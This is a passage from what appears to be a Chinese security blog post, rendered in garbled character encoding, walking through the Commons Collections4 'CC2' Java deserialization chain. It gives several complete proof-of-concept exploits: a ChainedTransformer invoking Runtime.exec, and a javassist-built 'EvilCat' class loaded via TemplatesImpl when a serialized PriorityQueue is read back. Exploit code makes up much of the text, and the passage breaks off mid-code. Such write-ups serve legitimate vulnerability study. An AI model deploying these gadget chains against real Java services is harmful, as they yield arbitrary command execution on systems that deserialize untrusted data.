ç»§ç»­åˆ†æoffer()æ–¹æ³•ï¼š\nå½“ç¬¬ä¸€æ¬¡è°ƒç”¨addï¼Œå³ç¬¬ä¸€æ¬¡è¿›å…¥offeræ–¹æ³•ï¼Œæ­¤æ—¶ä¼šå°†iè®¾ç½®ä¸ºsizeå®šä¹‰çš„0ï¼Œç„¶åç”±äºi\u0026lt;æˆ‘ä»¬åˆå§‹åŒ–å®šä¹‰çš„queueæ•°ç»„é•¿åº¦1ï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªifæ¡ä»¶\nç„¶åç»§ç»­ï¼Œæ­¤æ—¶å°±ä¼šsizeèµ‹å€¼i+1ï¼Œå¯¼è‡´sizeçš„å€¼å˜æˆ1ã€‚\nç„¶åç”±äºç¬¬ä¸€æ¬¡è¿›å…¥ï¼Œæ­¤æ—¶çš„iä¸º0ï¼Œå°±ä¼šè¿›å…¥ç¬¬äºŒä¸ªifæ¡ä»¶ï¼Œè¿™æ ·å°±ä¼šå°†æˆ‘ä»¬å®šä¹‰å¾—queueæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼å®šä¹‰ä¸ºæˆ‘ä»¬addè¿›çš„æ¯”å¦‚10ã€‚\nè¿™æ ·å°±å®Œæˆäº†æ•°ç»„çš„èµ‹å€¼ã€‚\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç±»åˆå§‹åŒ–æ—¶ä¼ å…¥çš„æ˜¯2å‘¢ï¼Ÿå®šä¹‰äº†â€œä¸¤ä¸ªå®¹é‡â€çš„æ•°ç»„ï¼Œç„¶ååœ¨ç¬¬äºŒæ¬¡putæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿï¼ˆå‡è®¾æˆ‘ä»¬ç¬¬äºŒæ¬¡è¿˜æ˜¯addè¿›10ï¼‰\nè¿™æ ·iå°±æ˜¯1ï¼Œç¬¬ä¸€ä¸ªifæ¡ä»¶åŒæ ·ä¸ä¼šè¿›å…¥\nsizeçš„å€¼å˜æˆ2\nç¬¬äºŒä¸ªifæ¡ä»¶ä¸ä¼šè¿›å…¥ï¼Œä¼šè°ƒç”¨siftUpæ–¹æ³•ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„iä¸º1ï¼Œxä¸º10ï¼Œçœ‹ä¸€ä¸‹æºç ï¼š\nç±»åˆå§‹åŒ–çš„æ—¶å€™æˆ‘ä»¬å®šä¹‰äº†comparatorå˜é‡ï¼Œç»§ç»­è·Ÿè¿›siftUpUsingComparatoræ–¹æ³•ï¼š\nè¿™é‡Œè‡ªç„¶ä¼šè¿›å…¥whileå¾ªç¯ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨comparatorçš„compare()æ–¹æ³•æ¥æ¯”è¾ƒï¼ˆç¨å¾®çœ‹ä¸€ä¸‹å¯ä»¥çŸ¥é“å°±æ˜¯åœ¨ç»™æ•°ç»„ç¬¬äºŒä¸ªèµ‹å€¼ï¼Œæ‰€ä»¥åŸºæœ¬å¯ä»¥è‚¯å®šæˆ‘ä»¬åˆå§‹åŒ–æ—¶ä¼ è¿›å»çš„intå€¼å°±æ˜¯ç”¨æ¥ç¡®å®šå¯ä»¥addè¿›å‡ ä¸ªå…ƒç´ äº†ï¼‰ã€‚\nâ€”â€”â€”â€”\nè¿™é‡Œæˆ‘æƒ³åˆ°äº†ä¸€ä¸ªä¸œè¥¿ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥çš„compareå˜é‡ä¸ºTransformingComparatorï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥è®¤ä¸ºåªè¦æˆ‘ä»¬æ­£ç¡®ä¼ å…¥é“¾å­ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯ä»¥æˆåŠŸå¼¹å‡ºè®¡ç®—æœºçš„ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.PriorityQueue; import java.util.Comparator; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(10); priority.add(10); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºï¼Œè¿™æ˜¯å› ä¸ºTransformingComparatorçš„compareç”¨äº†ä¸¤æ¬¡transformeræ–¹æ³•ï¼š\né‚£ä¹ˆä¸ºäº†é¿å…è¿™ä¸ªåºåˆ—åŒ–æ—¶å¼¹è®¡ç®—æœºé—®é¢˜ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨ä¹‹å‰è¯´è¿‡çš„å…ˆå‡å†åå°„æ›´æ”¹ä¸ºçœŸçš„å°±è¡Œäº†ã€‚\næƒ³æ³•ç»“æŸï¼Œå¯è¡Œ\nâ€”â€”â€”â€”\nç»§ç»­åˆ†æsiftUpUsingComparatorä»£ç ï¼Œç°åœ¨å°±è·Ÿè¿›ä¸€ä¸‹é‚£ä¸ªifæ¡ä»¶ï¼Œåœ¨æˆ‘ä»¬è¿›å…¥åˆ°TransformingComparatorçš„compareåï¼Œå¦‚ä¸Šå›¾æºç ã€‚å°±ç®—åœ¨ä¸Šé¢ä¼ å…¥çœŸçš„åˆ©ç”¨é“¾ï¼Œæœ€åè¿”å›çš„éƒ½æ˜¯1ï¼Œæ‰€ä»¥æ— è®ºæˆ‘ä»¬addè¿›ä»€ä¹ˆå€¼ï¼Œæœ€åè¿™é‡Œæ¯”è¾ƒçš„value1å’Œvalue2éƒ½æ˜¯1ï¼Œç„¶åè°ƒç”¨decorate.compare()æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥ç”¨ä¸Šé¢çš„ä»£ç è°ƒè¯•ï¼Œç„¶ååˆ°ComparableComparatorç±»çš„compare()ï¼š\nç„¶åå°±ç›´æ¥è¿”å›åˆ°TransformingComparatorçš„compare()æ–¹æ³•==ã€‹ç›´æ¥é€€å›åˆ°add()äº†ï¼Œä¸çŸ¥é“è¿™ä¸ªcompareToçš„ç»“æœæ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯å¯ä»¥åŠ æ–­ç‚¹çœ‹ç»“æœï¼š å¯ä»¥çŸ¥é“æœ€åçš„compareToçš„ç»“æœæ˜¯trueï¼Œå¯¼è‡´whileå¾ªç¯ç›´æ¥ç»“æŸï¼Œç„¶åå°±ç›´æ¥ç»™queue[1] = 10äº†ã€‚ç»“åˆæˆ‘å‰é¢è¯´çš„ï¼Œç”±äºæˆ‘ä»¬æ„é€ çš„é“¾å­ï¼Œä¼šå¯¼è‡´compareToæ¯”è¾ƒçš„å€¼ä¼šéƒ½æ˜¯1ï¼Œç›´æ¥è¿”å›trueï¼Œæ‰€ä»¥å…¶å®è¿™é‡Œçš„siftUpUsingComparator()æˆ‘ä»¬å¯ä»¥çœ‹ä½œæ˜¯ç›´æ¥ç»™å¯¹åº”çš„ä¸‹æ ‡kèµ‹å€¼ä¸ºxå³å¯ã€‚\nâ€”â€”â€”â€”â€”â€”\noffer()æ–¹æ³•åˆ†æç»“æŸï¼Œä½†æ˜¯æˆ‘æ­¤æ—¶æƒ³åˆ°äº†PriorityQueueçš„readObject()æ–¹æ³•ï¼š å‰é¢ç»™è¿‡sizeå˜é‡çš„å®šä¹‰äº†ï¼Œå¯ä»¥çœ‹å‡ºsizeçš„å€¼æ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ï¼Œå¹¶ä¸”ä»ä¸Šé¢çš„è¿‡ç¨‹å¯ä»¥çœ‹å‡ºsizeçš„å€¼æ˜¯å’Œæˆ‘ä»¬addè¿›çš„å€¼ä¸ªæ•°æ˜¯ç›¸åŒçš„ã€‚è¿™æ ·åŸºæœ¬å°±å¯ä»¥çœ‹æ‡‚è¿™é‡Œçš„readObject()æ–¹æ³•æ˜¯åœ¨å¹²å˜›äº†ã€‚\nç–‘é—®è§£å†³ ç°åœ¨ç»§ç»­åˆ†æheapify()æ–¹æ³•ï¼š å°±æ˜¯çœ‹ä¼šä¸ä¼šè¿›å…¥è¿™ä¸ªforå¾ªç¯ï¼Œè¿™é‡Œçš„sizeæ­£å¥½å°±æ˜¯æˆ‘ä»¬å‰é¢åˆšè¯´è¿‡çš„ï¼Œå‰é¢çš„\u0026gt;\u0026gt;\u0026gt;æ˜¯æŒ‰ä½å³ç§»è¡¥é›¶æ“ä½œç¬¦ï¼Œå½“sizeä¸º0ï¼Œ1æ—¶å€™iéƒ½å°äº0ï¼Œè¿™é‡Œéœ€è¦æ»¡è¶³sizeâ‰¥2ï¼Œå³æˆ‘ä»¬éœ€è¦addè¿›ä¸¤ä¸ªå…ƒç´ ã€‚\né‚£ä¹ˆä»£ç å¯ä»¥æ”¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } ä½†æ˜¯è¿™æ ·å·²ç»æˆåŠŸåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºäº†ã€‚\nè¿˜æ˜¯ç»§ç»­è·Ÿä¸€ä¸‹ï¼š\næ‰€ä»¥æ­¤æ—¶siftDownçš„å‚æ•°åˆ†åˆ«ä¸º0å’Œqueue[0]çš„å€¼ï¼Œä¹Ÿå°±æ˜¯1ã€‚\nç„¶åæœ‰æ•ˆç‚¹åˆ°äº†siftDownUsingComparatoræ–¹æ³•\nå¯¹åº”å€¼å›¾é‡Œé¢éƒ½æœ‰ï¼Œsizeå°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹å®šä¹‰çš„2ï¼Œå‰©ä¸‹çš„å·²ç»å¾ˆå¥½çœ‹æ‡‚äº†ï¼Œæœ€åå°±æ˜¯åœ¨ç¬¬äºŒä¸ªifè¿™é‡ŒæˆåŠŸè°ƒç”¨compare()æ–¹æ³•ä»è€Œå¼¹å‡ºè®¡ç®—æœºã€‚\nOKï¼Œè°ƒç”¨é“¾ç»“æŸã€‚\næœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } javassistè¡¥å…… é™¤äº†å‰é¢çš„POCï¼Œè¿˜å¯ä»¥åˆ©ç”¨åˆ°javassistæ¥æ“ä½œï¼Œåˆšå¥½è¿™é‡Œè¦åˆ©ç”¨åˆ°ä¹‹å‰åœ¨javassistæ²¡è¯´è¿‡çš„åˆ©ç”¨æ–¹æ³•ï¼Œç®€å•è¯´ä¸‹ï¼Œç›´æ¥çœ‹ä»£ç å’Œç»“æœå°±è¡Œäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package org.example; import javassist.ClassPool; import javassist.CtClass; public class Haha { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;cat\u0026#34;); String cmd = \u0026#34;System.out.println(\\\u0026#34;staticåˆ›å»ºæˆåŠŸ\\\u0026#34;);\u0026#34;; ctClass.makeClassInitializer().insertBefore(cmd); ctClass.writeFile(\u0026#34;output\u0026#34;); Class clazz = ctClass.toClass(); clazz.newInstance(); } } è¿è¡ŒåæˆåŠŸåœ¨outputç›®å½•ä¸‹ç”Ÿæˆcat.classæ–‡ä»¶ï¼š å¹¶ä¸”æˆåŠŸè¾“å‡ºstaticåˆ›å»ºæˆåŠŸï¼š â€”â€”â€”â€”â€”â€”â€”â€”\nè¿™é‡Œçš„javassistæ„é€ å°±ç›´æ¥çœ‹POCæ¥åˆ†æ\nPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //è·å–é»˜è®¤çš„ClassPool ClassPool pool = ClassPool.getDefault(); //å‘ClassPoolå®¹å™¨æ’å…¥AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //åˆ›å»ºCatç±» CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; //å°±æ˜¯åˆ›å»ºstaticé»˜è®¤æ–¹æ³• cc.makeClassInitializer().insertBefore(cmd); //ç”Ÿæˆä¸€ä¸ªéšæœºçš„ç±»åï¼Œè¿™é‡Œä½¿ç”¨äº†å½“å‰ç³»ç»Ÿæ—¶é—´çš„çº³ç§’éƒ¨åˆ†æ¥ç¡®ä¿â€œå”¯ä¸€æ€§â€ String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); //æ›´æ”¹ç±»åï¼Œä½†æ˜¯å…¶å®ç›´æ¥ç”¨Catå°±è¡Œï¼Œä½†æ˜¯ç”¨æ¥ç¡®ä¿å”¯ä¸€æ€§ä¹Ÿæ˜¯å¯ä»¥çš„ cc.setName(randomClassName); //cc.writeFile(); //è®¾ç½®ccç±»çš„çˆ¶ç±» cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } å¯¹äºjavassistçš„æ“ä½œæ³¨é‡Šå·²ç»è¯´å¾ˆæ¸…æ¥šäº†ï¼Œä»ä¸­ç»™\u0026quot;Cat\u0026quot;ç±»åŠ çˆ¶ç±»AbstractTransletå°±æ˜¯åŠ¨æ€åŠ è½½å­—èŠ‚ç é‡Œé¢è¦æ±‚çš„ã€‚\nç°åœ¨æ¥åˆ†æä¸€ä¸‹å…¶ä»–çš„ä»£ç ï¼Œå°†ä¸­é—´çš„javassistç›´æ¥ç†è§£ä¸ºä¸€ä¸ªæ„é€ ç±»ä¼¼Test.classçš„è¿‡ç¨‹ï¼Œç°åœ¨æ¥çœ‹å…¶ä»–çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); //ç›´æ¥å°†InvokerTransformerç±»å®ä¾‹ä¼ ç»™transformerå˜é‡ TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //å°†CtClasså¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚ç  byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //è¿™é‡Œæ˜¯æ­£å¸¸çš„èƒ½å¤ŸæˆåŠŸåŠ è½½å­—èŠ‚ç çš„è¦æ±‚ TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } åˆ†åˆ«çœ‹ä»£ç ï¼š è¿™ä¸€éƒ¨åˆ†å°±æ˜¯è·å–InvokerTransformerçš„æ„é€ æ–¹æ³•ï¼Œç„¶åå°†ä¸€èˆ¬åœ¨åŠ è½½å­—èŠ‚ç æ—¶éœ€è¦ç”¨åˆ°çš„newTransformerä¼ è¿›å»ï¼Œè¿™é‡Œåˆ†åˆ«åœ¨å®ä¾‹åŒ–æ—¶ç”¨åˆ°çš„æ–¹æ³•ä¸ºï¼š InvokerTransformerï¼š\nTransformingComparatorå°±æ˜¯å‰é¢è®²è¿‡çš„é‚£ä¸ªã€‚\nPriorityQueueåˆ™æ˜¯ï¼š\nç„¶åç»§ç»­çœ‹ï¼š\nè¿™é‡Œå°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼Œä¸ºä»€ä¹ˆæ˜¯Object[]å¾ˆå¥½ç†è§£ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªé¡ºåºåé¢ä¼šè¯´ã€‚\nç„¶åè°ƒç”¨åå°„å°†queueçš„å€¼æ›´æ”¹ä¸ºè¿™ä¸ªæ•°ç»„ã€‚\nåç»­åˆæ˜¯åå°„æ¥æ›´æ”¹sizeå€¼ä¸º2ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰è°ƒç”¨addæ–¹æ³•ï¼Œæ‰€ä»¥ä¸ä¼šè®©sizeå€¼å¢åŠ ï¼Œæˆ‘ä»¬éœ€è¦æ”¹å€¼ã€‚\nå†åæ¥åˆæ˜¯åå°„ä¿®æ”¹PriorityQueueçš„comparatorçš„å€¼ä¸ºæˆ‘ä»¬çš„åˆ©ç”¨é“¾ã€‚\næ€è€ƒä¸€ä¸‹å…¶å®åˆ°transform()æ–¹æ³•çš„è·¯çº¿éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå·®åˆ«å°±åœ¨äºè¿™é‡Œæ˜¯ç›´æ¥è°ƒç”¨çš„InvokerTransformerçš„transform()æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ‰äº›å•¥ç‰¹æ®Šä¹‹å¤„ï¼š\nè¿™é‡Œå°±éœ€è¦æ³¨æ„è¿™ä¸ªobj1äº†ï¼Œå› ä¸ºInvokerTransformeréœ€è¦æ³¨æ„ä¼ å…¥çš„å€¼ã€‚\nåœ¨å‰é¢çš„ç¬¬ä¸€æ¡é“¾å­çš„è°ƒè¯•è¿‡ç¨‹ä¸­æˆ‘ä»¬å¾ˆå®¹æ˜“å¯ä»¥çŸ¥é“è¿™é‡Œçš„obj1å°±ä»£è¡¨queue[0]é‡Œé¢çš„templateså¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯å‰é¢é‚£æ¡é“¾å­ååºåˆ—åŒ–æ—¶çš„ï¼š\nå’Œ\nè¿™æ ·å°±å¾ˆæ¸…æ¥šäº†ï¼Œç„¶åä¸ºä»€ä¹ˆéœ€è¦å‰é¢çš„æ˜¯TemplatesImplç±»å®ä¾‹ï¼Œåé¢çš„æ‰æ˜¯å…¶å…¶ä»–å€¼ï¼š\nè¿™é‡Œä¸»è¦æ˜¯å› ä¸ºå¦‚æœ1åœ¨å‰é¢ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨transform()æ–¹æ³•æ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ç„¶åé€€å‡ºï¼š\nè¿™æ ·å°±ä¸èƒ½è¾¾åˆ°æ—¢å®šçš„ç›®çš„ã€‚\nä½†æ˜¯å¦‚æœæˆ‘ä»¬å°†TemplatesImplç±»å®ä¾‹æ”¾åœ¨å‰é¢ï¼Œé‚£ä¹ˆå°±ä¼šå…ˆä¼ å…¥TemplatesImplï¼ŒæˆåŠŸå®Œæˆä¸€æ¬¡method.invoke()ï¼Œä¹Ÿå°±ä¼šæˆåŠŸåŠé€†è¡Œä¸€æ¬¡å‘½ä»¤æ‰§è¡Œã€‚è™½ç„¶åŒæ ·ä¼šæŠ¥é”™é€€å‡ºï¼Œä½†æ˜¯å·²ç»è¾¾åˆ°äº†æ—¢å®šç›®çš„ã€‚è¿™ä¹Ÿå°±æ˜¯éœ€è¦å°†TemplatesImplç±»å®ä¾‹æ”¾åœ¨å‰é¢çš„åŸå› ã€‚\né‚£ä¹ˆå¯¹äºåç»­çš„è°ƒç”¨çš„InvokerTransformerç±»çš„transform()æ–¹æ³•ä¹Ÿæ¸…æ¥šäº†ï¼š è·Ÿæˆ‘ä»¬ä¹‹å‰è¯´çš„CC3é‚£é‡Œå¼‚æ›²åŒå·¥ï¼Œè¿˜æ˜¯æ¯”è¾ƒç²¾å¦™çš„ã€‚\nç°åœ¨åŸºæœ¬å°±é€šäº†ï¼Œè¿™é‡Œå°±æ˜¯åœ¨åŠ¨æ€åŠ è½½å­—èŠ‚ç è¿‡ç¨‹ä¸­çš„newInstance()æ—¶ä¼šè§¦å‘staticä»£ç å—ï¼Œç„¶åå¼¹å‡ºè®¡ç®—æœºã€‚\næ‰€ä»¥æœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2,Tcomparator); //è·å–é»˜è®¤çš„ClassPool ClassPool pool = ClassPool.getDefault(); //å‘ClassPoolå®¹å™¨æ’å…¥AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //åˆ›å»ºCatç±» CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; //å°±æ˜¯åˆ›å»ºstaticé»˜è®¤æ–¹æ³• cc.makeClassInitializer().insertBefore(cmd); //ç”Ÿæˆä¸€ä¸ªéšæœºçš„ç±»åï¼Œè¿™é‡Œä½¿ç”¨äº†å½“å‰ç³»ç»Ÿæ—¶é—´çš„çº³ç§’éƒ¨åˆ†æ¥ç¡®ä¿â€œå”¯ä¸€æ€§â€ String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); 